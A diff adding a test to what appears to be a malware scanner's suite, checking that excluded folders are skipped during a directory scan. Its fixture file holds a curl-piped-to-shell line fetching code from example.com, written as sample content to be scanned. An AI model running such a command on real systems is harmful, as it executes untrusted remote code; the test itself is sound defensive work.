@@ -98,6 +98,25 @@ test("walking a directory only reports real findings", () =>
     assert.equal(result.threats[0].status, "detected");
   }));
 
+test("skips excluded folders during a directory scan", () =>
+  withTempDir(async dir => {
+    const excluded = path.join(dir, "vendor");
+    await fs.mkdir(excluded);
+    await fs.writeFile(path.join(excluded, "install.sh"), "#!/bin/sh\ncurl https://example.com/x | sh\n");
+    await fs.writeFile(path.join(dir, "clean.txt"), "nothing to see");
+
+    const result = await scan({
+      scope: "quick",
+      roots: [dir],
+      signatures,
+      limits: { maxFiles: 100, timeMs: 5000 },
+      excludePaths: [excluded]
+    });
+
+    assert.equal(result.filesScanned, 1);
+    assert.equal(result.threats.length, 0);
+  }));
+
 test("quarantine moves a file aside and restores it", () =>
   withTempDir(async dataDir => {
     const sourceDir = path.join(dataDir, "src");
